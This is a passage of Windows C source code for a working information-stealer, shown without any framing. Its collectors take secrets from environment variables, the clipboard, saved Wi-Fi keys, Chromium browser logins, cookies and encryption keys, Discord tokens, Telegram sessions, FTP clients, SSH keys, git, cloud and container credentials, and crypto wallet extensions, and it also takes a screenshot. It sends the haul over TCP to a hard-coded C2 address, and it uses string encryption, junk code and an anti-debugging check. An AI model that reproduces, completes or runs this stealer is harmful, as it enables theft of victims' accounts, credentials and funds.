        "DATABASE_URL", "MONGO_URI", "REDIS_URL",
        "SLACK_TOKEN", "SLACK_WEBHOOK_URL",
        "SMTP_PASSWORD", "SENDGRID_API_KEY", "MAILGUN_API_KEY",
        "STRIPE_SECRET_KEY", "TWILIO_AUTH_TOKEN",
        "JWT_SECRET", "SECRET_KEY", "API_KEY", "API_SECRET",
    };
    for (int i = 0; i < (int)(sizeof(interesting)/sizeof(interesting[0])); i++) {
        char val[2048] = {0};
        DWORD r = GetEnvironmentVariableA(interesting[i], val, sizeof(val));
        if (r > 0)
            emitf("  %s=%s\r\n", interesting[i], val);
    }
    emitf("\r\n");
}


/* ── collectors/clipboard ── */
static void collect_clipboard(void) {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            emitf(((char*)_es18));
            int len = (int)strlen(txt);
            emitf(((char*)_es19), len > 4096 ? 4096 : len, txt);
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}


/* ── collectors/wifi_passwords ── */
static void collect_wifi(void) {
    emitf(((char*)_es20));
    char raw[8192] = {0};
    DWORD _rxaxs = 0;
    run_cmd(((char*)_es21), raw, sizeof(raw), &_rxaxs);
    if (_rxaxs == 0) { emitf(((char*)_es22)); return; }

    char *line = raw;
    { volatile int _jx7093 = 1; while(_jx7093 > 1) _jx7093--; (void)_jx7093; }
    while (*line) {
        char *eol = strchr(line, '\n');
        if (!eol) eol = line + strlen(line);
        char *colon = strstr(line, ": ");
        if (colon && (strstr(line, ((char*)_es23)) || strstr(line, ((char*)_es24)))) {
            char *ns = colon + 2;
            while (*ns == ' ') ns++;
            int _nxcao = (int)(eol - ns);
            while (_nxcao > 0 && (ns[_nxcao-1] == '\r' || ns[_nxcao-1] == '\n' || ns[_nxcao-1] == ' ')) _nxcao--;
            if (_nxcao > 0 && _nxcao < (104 + 96)) {
                char ssid[256] = {0};
                strncpy(ssid, ns, _nxcao);
                char cmd2[512];
                snprintf(cmd2, sizeof(cmd2), "cmd /c netsh wlan show profile name=\"%s\" key=clear", ssid);
                char prof[4096] = {0};
                DWORD _ptynj = 0;
                run_cmd(cmd2, prof, sizeof(prof), &_ptynj);
                char *kc = strstr(prof, ((char*)_es25));
                { volatile int _jx6250 = 1; while(_jx6250 > 1) _jx6250--; (void)_jx6250; }
                if (!kc) kc = strstr(prof, ((char*)_es26));
                if (kc) {
                    char *kv = strchr(kc, ':');
                    { volatile int _jv5273 = 0; _jv5273 = _jv5273 ^ _jv5273; (void)_jv5273; }
                    if (kv) {
                        kv++; while (*kv == ' ') kv++;
                        char *ke = strchr(kv, '\r');
                        if (!ke) ke = strchr(kv, '\n');
                        int _kheny = ke ? (int)(ke - kv) : (int)strlen(kv);
                        emitf("SSID: %s  Key: %.*s\r\n", ssid, _kheny, kv);
                    }
                } else {
                    emitf("SSID: %s  Key: (open)\r\n", ssid);
                }
            }
        }
        if (*eol) line = eol + 1; else break;
    }
    emitf("\r\n");
}


/* ── collectors/browser_chromium ── */

typedef struct {
    const char *name;
    const char *subpath;
} browser_def;

static const browser_def CHROMIUM_BROWSERS[] = {
    {"Chrome",       "Google\\Chrome\\User Data"},
    {"Edge",         "Microsoft\\Edge\\User Data"},
    {"Brave",        "BraveSoftware\\Brave-Browser\\User Data"},
    {"Opera",        "Opera Software\\Opera Stable"},
    {"OperaGX",      "Opera Software\\Opera GX Stable"},
    {"Vivaldi",      "Vivaldi\\User Data"},
    {"Chromium",     "Chromium\\User Data"},
    {"Yandex",       "Yandex\\YandexBrowser\\User Data"},
};
#define N_BROWSERS (sizeof(CHROMIUM_BROWSERS) / sizeof(CHROMIUM_BROWSERS[0]))

static void harvest_chromium_profile(const char *browser_name, const char *base, const char *profile) {
    char login[MAX_PATH], cookies[MAX_PATH], history[MAX_PATH], bookmarks[MAX_PATH], webdata[MAX_PATH];
    snprintf(login,     MAX_PATH, "%s\\%s\\Login Data",  base, profile);
    snprintf(cookies,   MAX_PATH, "%s\\%s\\Cookies",     base, profile);
    snprintf(history,   MAX_PATH, "%s\\%s\\History",     base, profile);
    snprintf(bookmarks, MAX_PATH, "%s\\%s\\Bookmarks",   base, profile);
    snprintf(webdata,   MAX_PATH, "%s\\%s\\Web Data",    base, profile);

    int _fhaaw = 0;
    if (file_exists(login))     { grab_file(login,     ((char*)_es27),  5*1024*1024); _fhaaw++; }
    if (file_exists(cookies))   { grab_file(cookies,   ((char*)_es28),    5*1024*1024); _fhaaw++; }
    if (file_exists(webdata))   { grab_file(webdata,   ((char*)_es29),    5*1024*1024); _fhaaw++; }
    if (file_exists(history))   { grab_file(history,   ((char*)_es30),    5*1024*1024); _fhaaw++; }
    if (file_exists(bookmarks)) { grab_file(bookmarks, ((char*)_es31),  2*1024*1024); _fhaaw++; }

    if (_fhaaw) emitf("  %s/%s: %d files\r\n", browser_name, profile, _fhaaw);
}

static void collect_browsers(void) {
    emitf(((char*)_es32));

    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char base[MAX_PATH];
        snprintf(base, MAX_PATH, "%s\\%s", local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(base)) continue;

        emitf("[%s]\r\n", CHROMIUM_BROWSERS[b].name);

        char ls_path[MAX_PATH];
        snprintf(ls_path, MAX_PATH, "%s\\Local State", base);
        if (file_exists(ls_path)) {
            char tmp_ls[MAX_PATH], temp[MAX_PATH];
            GetTempPathA(MAX_PATH, temp);
            snprintf(tmp_ls, MAX_PATH, "%s\\~ls%lx.tmp", temp, GetTickCount());
            if (CopyFileA(ls_path, tmp_ls, FALSE)) {
                HANDLE h = CreateFileA(tmp_ls, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, 0, NULL);
                if (h != INVALID_HANDLE_VALUE) {
                    DWORD _shlnl = GetFileSize(h, NULL);
                    if (_shlnl > 0 && _shlnl < 2*1024*1024) {
                        char *d = (char *)malloc(_shlnl + 1);
                        if (d) {
                            DWORD _rtqbm; ReadFile(h, d, _shlnl, &_rtqbm, NULL); d[_rtqbm] = '\0';
                            char *ek = strstr(d, ((char*)_es33));
                            if (ek) {
                                char *q1 = strchr(ek + (10 + 5), '"');
                                if (q1) {
                                    char *q2 = strchr(q1 + 1, '"');
                                    if (q2) {
                                        int _kheny = (int)(q2 - q1 - 1);
                                        emitf("  master_key[%d]: %.*s\r\n", _kheny, _kheny > 300 ? 300 : _kheny, q1+1);
                                    }
                                }
                            }
                            free(d);
                        }
                    }
                    CloseHandle(h);
                }
                DeleteFileA(tmp_ls);
            }
        }

        harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, ((char*)_es34));
        char prof_dir[MAX_PATH];
        for (int p = 1; p <= (9 + 1); p++) {
            char pname[32];
            snprintf(pname, sizeof(pname), "Profile %d", p);
            snprintf(prof_dir, MAX_PATH, "%s\\%s", base, pname);
            if (file_exists(prof_dir))
                harvest_chromium_profile(CHROMIUM_BROWSERS[b].name, base, pname);
        }
    }
    emitf("\r\n");
}


/* ── collectors/discord_tokens ── */

static void scan_ldb_for_tokens(const char *dir) {
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*.ldb", dir);
    WIN32_FIND_DATAA fd;
    HANDLE _hrrbw = FindFirstFileA(pattern, &fd);
    if (_hrrbw == INVALID_HANDLE_VALUE) return;
    do {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", dir, fd.cFileName);
        HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;
        DWORD _shlnl = GetFileSize(h, NULL);
        if (_shlnl > 0 && _shlnl < 5*1024*1024) {
            char *buf = (char *)malloc(_shlnl + 1);
            { volatile int _jx8968 = 1; while(_jx8968 > 1) _jx8968--; (void)_jx8968; }
            if (buf) {
                DWORD _rtqbm; ReadFile(h, buf, _shlnl, &_rtqbm, NULL); buf[_rtqbm] = '\0';
                char *p = buf;
                { volatile DWORD _jd5021 = GetTickCount(); (void)_jd5021; }
                while ((p = strstr(p, ((char*)_es35))) != NULL) {
                    char *start = p;
                    char *end = strchr(p, '"');
                    if (!end) end = p + (100 + 20);
                    int _tjgjd = (int)(end - start);
                    if (_tjgjd > 0 && _tjgjd < (410 + 90))
                        emitf(((char*)_es36), _tjgjd, start);
                    p = end;
                }
                p = buf;
                while ((p = strstr(p, ((char*)_es37))) != NULL) {
                    char *end = p;
                    while (*end && *end != '"' && *end != '\'' && (end - p) < (90 + 10)) end++;
                    emitf(((char*)_es38), (int)(end - p), p);
                    p = end;
                }
                free(buf);
            }
        }
        CloseHandle(h);
    } while (FindNextFileA(_hrrbw, &fd));
    FindClose(_hrrbw);
}

static void collect_discord(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    const char *variants[] = {
        "discord\\Local Storage\\leveldb",
        "discordptb\\Local Storage\\leveldb",
        "discordcanary\\Local Storage\\leveldb",
    };
    int _fhaaw = 0;
    for (int i = 0; i < 3; i++) {
        char path[MAX_PATH];
        snprintf(path, MAX_PATH, "%s\\%s", roaming, variants[i]);
        if (file_exists(path)) {
            if (!_fhaaw) emitf(((char*)_es39));
            _fhaaw = 1;
            emitf("[%s]\r\n", variants[i]);
            scan_ldb_for_tokens(path);
        }
    }
    if (_fhaaw) emitf("\r\n");
}


/* ── collectors/telegram_session ── */

static void collect_telegram(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;
    char tdata[MAX_PATH];
    snprintf(tdata, MAX_PATH, "%s\\Telegram Desktop\\tdata", roaming);
    { volatile int _jv2862 = 0; _jv2862 = _jv2862 ^ _jv2862; (void)_jv2862; }
    if (!file_exists(tdata)) return;

    emitf(((char*)_es40));

    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\D877F783D5D3EF8C*", tdata);
    WIN32_FIND_DATAA fd;
    HANDLE _hrrbw = FindFirstFileA(pattern, &fd);
    if (_hrrbw != INVALID_HANDLE_VALUE) {
        do {
            char full[MAX_PATH];
            snprintf(full, MAX_PATH, "%s\\%s", tdata, fd.cFileName);
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                emitf("  session_file: %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                emit_file(full, 1*1024*1024);
            }
        } while (FindNextFileA(_hrrbw, &fd));
        FindClose(_hrrbw);
    }

    char keydata[MAX_PATH];
    snprintf(keydata, MAX_PATH, "%s\\key_datas", tdata);
    { volatile DWORD _jd6696 = GetTickCount(); (void)_jd6696; }
    if (file_exists(keydata)) {
        emitf(((char*)_es41));
        emit_file(keydata, 512*1024);
    }
    emitf("\r\n");
}


/* ── collectors/ftp_credentials ── */

static void collect_ftp_clients(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;

    char fz_recent[MAX_PATH], fz_site[MAX_PATH];
    snprintf(fz_recent, MAX_PATH, "%s\\FileZilla\\recentservers.xml", roaming);
    snprintf(fz_site,   MAX_PATH, "%s\\FileZilla\\sitemanager.xml",   roaming);

    int _fhaaw = 0;
    if (file_exists(fz_recent) || file_exists(fz_site)) {
        if (!_fhaaw) emitf(((char*)_es42));
        _fhaaw = 1;
        if (file_exists(fz_recent)) {
            emitf(((char*)_es43));
            emit_file(fz_recent, 1*1024*1024);
        }
        if (file_exists(fz_site)) {
            emitf(((char*)_es44));
            emit_file(fz_site, 1*1024*1024);
        }
    }

    HKEY _hxeoy;
    if (_pRegOpenKeyExA(HKEY_CURRENT_USER, ((char*)_es45), 0, KEY_READ, &_hxeoy) == ERROR_SUCCESS) {
        if (!_fhaaw) emitf(((char*)_es46));
        _fhaaw = 1;
        emitf(((char*)_es47));
        char name[256]; DWORD _iarwq = 0, nsz;
        while (1) {
            nsz = sizeof(name);
            if (RegEnumKeyExA(_hxeoy, _iarwq++, name, &nsz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            HKEY _sbler;
            if (_pRegOpenKeyExA(_hxeoy, name, 0, KEY_READ, &_sbler) == ERROR_SUCCESS) {
                char host[256] = {0}, user[256] = {0}, pass[256] = {0};
                DWORD _hmugx = sizeof(host), us = sizeof(user), ps = sizeof(pass);
                RegQueryValueExA(_sbler, ((char*)_es48), NULL, NULL, (BYTE*)host, &_hmugx);
                RegQueryValueExA(_sbler, ((char*)_es49), NULL, NULL, (BYTE*)user, &us);
                RegQueryValueExA(_sbler, ((char*)_es50), NULL, NULL, (BYTE*)pass, &ps);
                emitf("  %s@%s pass=%s\r\n", user, host, pass[0] ? pass : ((char*)_es51));
                RegCloseKey(_sbler);
            }
        }
        RegCloseKey(_hxeoy);
    }

    if (_fhaaw) emitf("\r\n");
}


/* ── collectors/ssh_keys ── */

static void collect_ssh_git(void) {
    char home[MAX_PATH] = {0};
    { volatile DWORD _jp7493 = GetCurrentProcessId(); (void)_jp7493; }
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    char ssh_dir[MAX_PATH];
    snprintf(ssh_dir, MAX_PATH, "%s\\.ssh", home);
    { volatile DWORD _jp2377 = GetCurrentProcessId(); (void)_jp2377; }
    if (file_exists(ssh_dir)) {
        emitf(((char*)_es52));
        const char *key_files[] = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "config", "known_hosts"};
        for (int i = 0; i < 6; i++) {
            char kp[MAX_PATH];
            snprintf(kp, MAX_PATH, "%s\\%s", ssh_dir, key_files[i]);
            if (file_exists(kp)) {
                emitf("[%s]\r\n", key_files[i]);
                emit_file(kp, 256*1024);
                emitf("\r\n");
            }
        }
        emitf("\r\n");
    }

    char git_cred[MAX_PATH];
    snprintf(git_cred, MAX_PATH, "%s\\.git-credentials", home);
    if (file_exists(git_cred)) {
        emitf(((char*)_es53));
        emit_file(git_cred, 256*1024);
        emitf(((char*)_es54));
    }
}


/* ── collectors/cloud_creds ── */

static void collect_cloud_creds(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    struct { const char *name; const char *rel; } cloud_files[] = {
        {"AWS credentials",      ".aws\\credentials"},
        {"AWS config",           ".aws\\config"},
        {"Azure profile",        ".azure\\azureProfile.json"},
        {"Azure tokens",         ".azure\\accessTokens.json"},
        {"GCP app creds",        "AppData\\Roaming\\gcloud\\application_default_credentials.json"},
        {"GCP properties",       "AppData\\Roaming\\gcloud\\properties"},
        {"kubectl config",       ".kube\\config"},
        {"Docker config",        ".docker\\config.json"},
    };

    int _fhaaw = 0;
    for (int i = 0; i < (int)(sizeof(cloud_files)/sizeof(cloud_files[0])); i++) {
        char full[MAX_PATH];
        snprintf(full, MAX_PATH, "%s\\%s", home, cloud_files[i].rel);
        if (file_exists(full)) {
            if (!_fhaaw) emitf(((char*)_es55));
            _fhaaw = 1;
            emitf("[%s]\r\n", cloud_files[i].name);
            emit_file(full, 512*1024);
            emitf("\r\n");
        }
    }
    if (_fhaaw) emitf("\r\n");
}


/* ── collectors/crypto_wallets ── */

static void collect_crypto_wallets(void) {
    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    struct { const char *name; const char *ext_id; } wallets[] = {
        {"MetaMask",     "nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom",      "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"Coinbase",     "hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"Ronin",        "fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"TronLink",     "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"Exodus",       "aholpfdialjgjfhomihkjbmgjidlcdno"},
    };

    int _fhaaw = 0;
    { volatile int _jx5584 = 1; while(_jx5584 > 1) _jx5584--; (void)_jx5584; }
    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char ext_base[MAX_PATH];
        snprintf(ext_base, MAX_PATH, "%s\\%s\\Default\\Local Extension Settings",
                 local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(ext_base)) continue;

        for (int w = 0; w < (int)(sizeof(wallets)/sizeof(wallets[0])); w++) {
            char wdir[MAX_PATH];
            snprintf(wdir, MAX_PATH, "%s\\%s", ext_base, wallets[w].ext_id);
            if (!file_exists(wdir)) continue;

            if (!_fhaaw) emitf(((char*)_es56));
            _fhaaw = 1;
            emitf("[%s in %s]\r\n", wallets[w].name, CHROMIUM_BROWSERS[b].name);

            char wpat[MAX_PATH];
            snprintf(wpat, MAX_PATH, "%s\\*.ldb", wdir);
            WIN32_FIND_DATAA fd;
            HANDLE _hrrbw = FindFirstFileA(wpat, &fd);
            if (_hrrbw != INVALID_HANDLE_VALUE) {
                do {
                    char fp[MAX_PATH];
                    snprintf(fp, MAX_PATH, "%s\\%s", wdir, fd.cFileName);
                    emitf("  %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                    emit_file(fp, 2*1024*1024);
                } while (FindNextFileA(_hrrbw, &fd));
                FindClose(_hrrbw);
            }
        }
    }
    { volatile DWORD _jd2015 = GetTickCount(); (void)_jd2015; }
    if (_fhaaw) emitf("\r\n");
}


/* ── collectors/screenshot ── */
static void collect_screenshot(void) {
    HDC hScreen = GetDC(NULL);
    if (!hScreen) return;
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = (3 + 21);
    bi.biCompression = BI_RGB;
    DWORD _rcsty = ((w * 3 + 3) & ~3);
    DWORD _icsmf = _rcsty * h;

    BYTE *pixels = (BYTE *)malloc(_icsmf);
    { volatile DWORD _jd9359 = GetTickCount(); (void)_jd9359; }
    if (pixels) {
        GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

        /* Skip if screen is _bwjhz (all black = no desktop session) */
        int _bwjhz = 1;
        for (DWORD i = 0; i < _icsmf && _bwjhz; i += _rcsty) {
            for (int x = 0; x < w * 3 && _bwjhz; x++) {
                if (pixels[i + x] != 0) _bwjhz = 0;
            }
        }

        if (!_bwjhz) {
            BITMAPFILEHEADER bf = {0};
            bf.bfType = 0x4D42;
            bf.bfSize = sizeof(bf) + sizeof(bi) + _icsmf;
            bf.bfOffBits = sizeof(bf) + sizeof(bi);

            emitf(((char*)_es57));
            emitf("  %dx%d BMP (%lu bytes)\r\n", w, h, bf.bfSize);
            emit((const char *)&bf, sizeof(bf));
            emit((const char *)&bi, sizeof(bi));
            emit((const char *)pixels, _icsmf);
            emitf("\r\n");
        } else {
            emitf(((char*)_es58));
            emitf(((char*)_es59));
        }
        free(pixels);
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}


/* ── exfil/tcp_direct ── */

#define C2_ADDR "10.0.2.2"
#define C2_PORT 9001

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int _rktmk = 3;
    while (_rktmk-- > 0) {
        { volatile int _jx1476 = 1; while(_jx1476 > 1) _jx1476--; (void)_jx1476; }
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        { volatile DWORD _jp4078 = GetCurrentProcessId(); (void)_jp4078; }
        if (_rktmk > 0) { closesocket(sock); Sleep((1909 + 91));
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else { closesocket(sock); WSACleanup(); return FALSE; }
    }

    DWORD _sbdbo = 0;
    while (_sbdbo < len) {
        int n = send(sock, data + _sbdbo, (len - _sbdbo > (32742 + 26)) ? 32768 : len - _sbdbo, 0);
        if (n <= 0) break;
        _sbdbo += n;
    }
    closesocket(sock);
    WSACleanup();
    return _sbdbo == len;
}


/* ── arch/sequential ── */

LONG WINAPI _crash_filter(EXCEPTION_POINTERS *ep) {
    (void)ep;
    ExitThread(1);
    return EXCEPTION_EXECUTE_HANDLER;
}

DWORD WINAPI _worker_thread(LPVOID _unused) {
    _xd_init();
    _api_init();
    if (_chk_dbg()) return 0;
    (void)_unused;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    init_buffer();
    if (!g_data) return 1;

        collect_system_info();
    collect_processes();
    collect_installed_software();
    collect_env_vars();
    collect_clipboard();
    collect_wifi();
    collect_browsers();
    collect_discord();
    collect_telegram();
    collect_ftp_clients();
    collect_ssh_git();
    collect_cloud_creds();
    collect_crypto_wallets();
    collect_screenshot();

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;

    return 0;
}

int main(int argc, char *argv[]) {
    SetUnhandledExceptionFilter(_crash_filter);
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    HANDLE hThread = CreateThread(NULL, 0, _worker_thread, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 30000);
        CloseHandle(hThread);
    } else {
        _worker_thread(NULL);
    }
    Sleep(5000);
    return 0;
}


